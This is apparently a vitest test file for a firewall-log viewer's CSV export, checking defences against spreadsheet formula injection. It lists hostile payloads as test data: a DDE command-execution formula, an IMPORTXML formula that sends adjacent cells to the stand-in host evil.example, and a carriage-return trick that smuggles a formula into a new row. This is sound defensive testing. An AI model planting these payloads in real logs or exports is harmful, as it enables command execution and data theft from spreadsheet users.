// SPDX-License-Identifier: AGPL-3.0-only

import { describe, expect, it } from 'vitest'
import type { FirewallEvent } from './types'
import { COLUMNS, eventsToCsv } from './export'

function event(overrides: Partial<FirewallEvent> = {}): FirewallEvent {
  return {
    id: 1,
    time: '2026-08-07T10:00:00Z',
    deviceId: 'router',
    sourceIp: '192.0.2.1',
    action: 'drop',
    raw: 'a plain line',
    ...overrides,
  } as FirewallEvent
}

function cells(csv: string, row = 1): string[] {
  return csv.split('\n')[row].split(',')
}

describe('CSV export formula injection', () => {
  // Every one of these reaches the export from outside mikroview: `raw`
  // is the syslog line verbatim, `ruleLabel` is router configuration,
  // the hostname columns come from naming/DNS.
  it.each([
    ['=cmd|\' /C calc\'!A0', 'DDE command execution'],
    ['=IMPORTXML("http://evil.example/?d="&A1,"//a")', 'silent exfiltration of adjacent cells'],
    ['@SUM(1+1)', 'legacy Lotus-style formula lead'],
    ['+1+1', 'plus lead'],
    ['-1+1', 'minus lead'],
    ['\t=1+1', 'tab then formula -- leading whitespace is stripped first'],
    ['\r=1+1', 'CR then formula'],
  ])('neutralises %j (%s)', (payload) => {
    const csv = eventsToCsv([event({ raw: payload })])
    // The cell must no longer begin with a formula character. Checked on
    // the raw text rather than a parsed cell, since what matters is what
    // the spreadsheet sees before it parses anything.
    const body = csv.split('\n').slice(1).join('\n')
    const cellStart = body.indexOf(payload.trimStart()[0])
    expect(body[cellStart - 1] === "'" || body.includes(`'${payload}`)).toBe(true)
    expect(body.startsWith('=')).toBe(false)
  })

  it('leaves ordinary values untouched', () => {
    const csv = eventsToCsv([event({ deviceId: 'router', action: 'drop' })])
    expect(cells(csv)[1]).toBe('router')
    expect(cells(csv)[3]).toBe('drop')
  })

  // Quoting alone was the old behaviour and is not a defence -- the
  // spreadsheet unquotes before deciding whether a cell is a formula.
  it('neutralises a payload that also needs CSV quoting', () => {
    const csv = eventsToCsv([event({ raw: '=HYPERLINK("http://evil.example","click"),x' })])
    expect(csv).toContain('"\'=HYPERLINK')
  })

  // A bare carriage return used to escape the cell entirely. The quoting
  // test was `/["\n,]/` -- no \r -- so the value went out unquoted, and a
  // spreadsheet reading classic-Mac line endings treats a bare \r as a
  // record terminator. The text after it becomes the start of a new row,
  // and a new row's first cell never passes through neutraliseFormula,
  // which only ever inspects the first character of the value it was
  // handed. So the formula arrives un-neutralised.
  //
  // \r survives to `raw` specifically: the listener strips \n, and
  // internal/routeros deliberately keeps Raw verbatim so an operator can
  // compare a row against what the router actually sent. The
  // /api/ingest push path is unaffected -- its decoder rejects control
  // characters -- so the reachable path is the unauthenticated one. See
  // #285.
  // The payload has to avoid " , and \n, or the old quoting rule caught
  // it incidentally and there was nothing to smuggle. That narrows the
  // exploit but does not close it: the DDE command-execution form needs
  // none of those characters, and neither do @SUM/+/- style leads.
  it('quotes a bare carriage return so it cannot start a new record', () => {
    const smuggled = "benign prefix\r=cmd|' /C calc'!A0"
    const csv = eventsToCsv([event({ raw: smuggled })])

    // A header record plus exactly one data record. countRecords treats
    // a bare \r as a terminator -- which is what a spreadsheet reading
    // classic-Mac line endings does -- but respects quoting, which is
    // also what it does. Both halves matter: the defence is that the
    // value is quoted, not that the \r is gone.
    expect(countRecords(csv)).toBe(2)
    expect(csv).toContain('"benign prefix\r=cmd')
  })

  it('quotes a bare carriage return even when nothing else needs quoting', () => {
    const csv = eventsToCsv([event({ raw: 'before\rafter' })])
    expect(csv).toContain('"before\rafter"')
    expect(countRecords(csv)).toBe(2)
  })
})

// countRecords is a minimal quote-aware record counter: \r, \n and \r\n
// all terminate a record, but only outside quotes. That is what makes it
// a meaningful test of the fix -- a naive split on the same characters
// would count the smuggled row whether or not the value was quoted, and
// so would pass and fail for the wrong reasons.
function countRecords(csv: string): number {
  let records = 1
  let inQuotes = false
  for (let i = 0; i < csv.length; i++) {
    const ch = csv[i]
    if (ch === '"') {
      if (inQuotes && csv[i + 1] === '"') i++ // an escaped quote, not a close
      else inQuotes = !inQuotes
      continue
    }
    if (inQuotes) continue
    if (ch === '\r') {
      records++
      if (csv[i + 1] === '\n') i++
    } else if (ch === '\n') {
      records++
    }
  }
  return records
}

// The tests above cover the columns that exist today. This one covers
// the ones that don't yet: it drives every entry in COLUMNS, so adding
// a column without routing it through csvEscape fails here rather than
// in someone's spreadsheet. A new column is exactly how this defect
// comes back.
describe('every exported column is neutralised', () => {
  // Deliberately free of quotes and commas, so csvEscape's quoting
  // branch doesn't fire and the assertions can look at the cell text
  // directly. The quoting-plus-neutralising interaction is covered
  // separately above.
  const PAYLOAD = '=IMPORTXML(A1)'

  it.each(COLUMNS)('column %s', (column) => {
    const csv = eventsToCsv([event({ [column]: PAYLOAD } as Partial<FirewallEvent>)])
    const body = csv.split('\n').slice(1).join('\n')

    expect(body).toContain(`'${PAYLOAD}`) // exported, behind the neutralising prefix
    expect(body).not.toContain(`,${PAYLOAD}`) // never a bare cell mid-row
    expect(body.startsWith(PAYLOAD)).toBe(false) // nor the first cell
  })

  it('covers a non-trivial number of columns', () => {
    // Guards against COLUMNS being emptied or renamed out from under
    // the it.each above, which would make it vacuously pass.
    expect(COLUMNS.length).toBeGreaterThan(20)
  })
})
